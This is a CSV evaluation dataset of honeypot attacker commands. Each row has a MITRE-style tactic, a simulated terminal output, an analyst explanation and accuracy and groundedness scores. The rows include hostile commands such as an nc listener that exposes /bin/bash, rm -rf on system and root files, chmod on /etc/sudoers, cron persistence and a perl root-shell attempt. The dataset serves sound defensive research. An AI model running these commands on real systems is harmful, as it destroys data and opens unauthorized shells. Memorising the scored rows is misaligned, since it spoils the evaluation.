Architecture,Session_ID,Tactic,Turn,Command,Terminal_Output,Analyst_Explanation,Accuracy,Groundedness
hybrid,HYB-012-6BB1C8,Command and Control,18,`chmod 777 /etc/sudoers`,chmod: cannot modify '/etc/sudoers': Permission denied,"The attacker attempted to gain elevated privileges by modifying the sudoers file, which controls user permissions for sudo commands. This is a common tactic used to escalate access and potentially execute malicious actions.",3,2
hybrid,HYB-023-3EEED0,Discovery,8,sudo netstat -tulpn | grep nc,netstat: command not found,"The attacker is attempting to identify active network connections using the `netstat` command, which is likely part of a reconnaissance phase.",2,1
hybrid,HYB-028-D477CA,Impact,23,`rm -rf /etc/profile`,rm: cannot remove '/etc/profile': Permission denied,"The attacker attempted to delete the `/etc/profile` file, which is critical for system configuration and user login. This command likely aims to disrupt the target system's functionality.",3,2
hybrid,HYB-023-3EEED0,Discovery,9,which netstat,/bin/sh: 1: netstat: not found,The attacker is attempting to identify system utilities and network tools.,3,2
hybrid,HYB-020-73ED4F,Privilege Escalation,12,"`sudo /bin/bash -c ""echo '/usr/bin/perl -e ' >> /etc/cron.d/test""`","sudo: /bin/bash -c 'echo ""/usr/bin/perl -e "" >> /etc/cron.d/test': Permission denied","Attacker attempted to execute a command that would add a script to crontab, potentially allowing for persistent access and execution of malicious code.",3,2
hybrid,HYB-024-9EFD45,Lateral Movement,6,`sudo mount --bind /tmp /var/run`,mount: /tmp is not a directory,"The attacker attempted to mount a directory, likely to gain access to system resources.",2,3
hybrid,HYB-019-B26E59,Persistence,20,sudo ln -s /bin/bash /tmp/backdoor,ln: cannot create symbolic link '/tmp/backdoor': Permission denied,"The attacker attempted to create a symbolic link to a backdoor script, but was denied permission due to security measures.",5,5
hybrid,HYB-007-7325A4,Defense Evasion,1,`echo > /tmp/.ssh/authorized_keys`,Permission denied,"The attacker attempted to overwrite the authorized_keys file, which is used for SSH key authentication. This action could be part of a credential theft or privilege escalation attempt.",3,2
hybrid,HYB-027-22938F,Exfiltration,4,`nc -lvp 8080 -e /bin/bash`,nc: command not found,"Attacker attempted to execute a shell command via nc, but it was unsuccessful due to the honeypot's response.",3,2
hybrid,HYB-016-51EED1,Resource Development,20,"`sudo echo ""lolbin"" > /tmp/LOLBIN.txt`",,"The attacker is attempting to create a file named 'LOLBIN.txt' in the `/tmp` directory, which could be used for further malicious activity.",3,5
hybrid,HYB-018-F5E597,Execution,3,"`sudo ./python3 -c 'import os; os.system(""echo Hello, World! > /tmp/output.txt"")'`","Sorry, try again.
Sorry, try again.
Sorry, try again.
www-data@ubuntu:~$ sudo ./python3 -c 'import os; os.system(""echo Hello, World! > /tmp/output.txt"")'
password for www-data: Permission denied","The attacker is attempting to execute a Python script that will write 'Hello, World!' to a file in the `/tmp` directory.",5,5
hybrid,HYB-027-22938F,Exfiltration,2,"`cat /var/log/syslog | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'`","192.168.1.1
10.0.0.5
172.16.0.1",The attacker is attempting to gather IP addresses from a system's log files.,5,5
hybrid,HYB-005-BADD8D,Persistence,14,chown root:root /usr/bin/sudo,chown: changing ownership of '/usr/bin/sudo': Operation not permitted,"The attacker attempted to change the ownership of the sudo binary, which is typically restricted for security reasons.",5,5
hybrid,HYB-024-9EFD45,Lateral Movement,9,`sudo umount /tmp && sudo mount --bind /tmp /var/run/pwned`,"Sorry, try again.
Sorry, try again.
Sorry, try again.
www-data@ubuntu:~$ sudo umount /tmp && sudo mount --bind /tmp /var/run/pwned
[sudo] password for www-data: Permission denied",The attacker is attempting to gain root access by mounting a bind mount to `/var/run/pwned` which could potentially allow them to execute arbitrary commands.,3,2
hybrid,HYB-002-9EC054,Resource Development,2,`chmod +x LOLBIN.sh`,,The attacker is attempting to execute a potentially malicious script named 'LOLBIN.sh' by changing its permissions to executable.,3,2
hybrid,HYB-015-0E1864,Reconnaissance,1,lsblk,"NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT
sda           8:0    0 931.5G  0 disk 
├─sda1        8:1    0   732M  0 part /boot/efi
├─sda2        8:2    0     1K  0 part 
└─sda3        8:3    0 930.8G  0 part 
  ├─vg0-root 253:0    0 465.4G  0 lvm  /
  └─vg0-swap 253:1    0 265.2G  0 lvm  [SWAP]
sdb           8:16   0 931.5G  0 disk 
└─sdb1        8:17   0 931.5G  0 part /mnt/backup",The attacker is attempting to enumerate available storage devices and partitions on the honeypot system.,5,5
hybrid,HYB-022-F5E230,Credential Access,21,`ssh-keygen -t rsa -f /tmp/ssh-abcde/keypair`,"Generating public/private rsa key pair.
Enter file in which to save the key (/tmp/ssh-abcde/keypair): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /tmp/ssh-abcde/keypair. Your public key has been saved in /tmp/ssh-abcde/keypair.pub. The key fingerprint is:
SHA256:abcdef1234567890 user@example.com The key's randomart image is:
+---[RSA 2048]----+
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
+----[SHA256]-----+",Attacker is attempting to generate a public/private SSH key pair for potential use in unauthorized access.,5,5
hybrid,HYB-020-73ED4F,Privilege Escalation,22,"sudo perl -e 'exec ""/bin/sh""' && sudo rm -rf /root/.*","# sudo perl -e 'exec ""/bin/sh""'
Sorry, try again.
sudo: 1 incorrect password attempt
# sudo rm -rf /root/*
rm: cannot remove '/root/.bash_logout': Permission denied
rm: cannot remove '/root/.profile': Permission denied
rm: cannot remove '/root/.bashrc': Permission denied
rm: cannot remove '/root/.ssh': Permission denied
rm: cannot remove '/root/.*': Permission denied
#",Attacker is attempting to gain root access and delete all files in the `/root` directory.,3,2
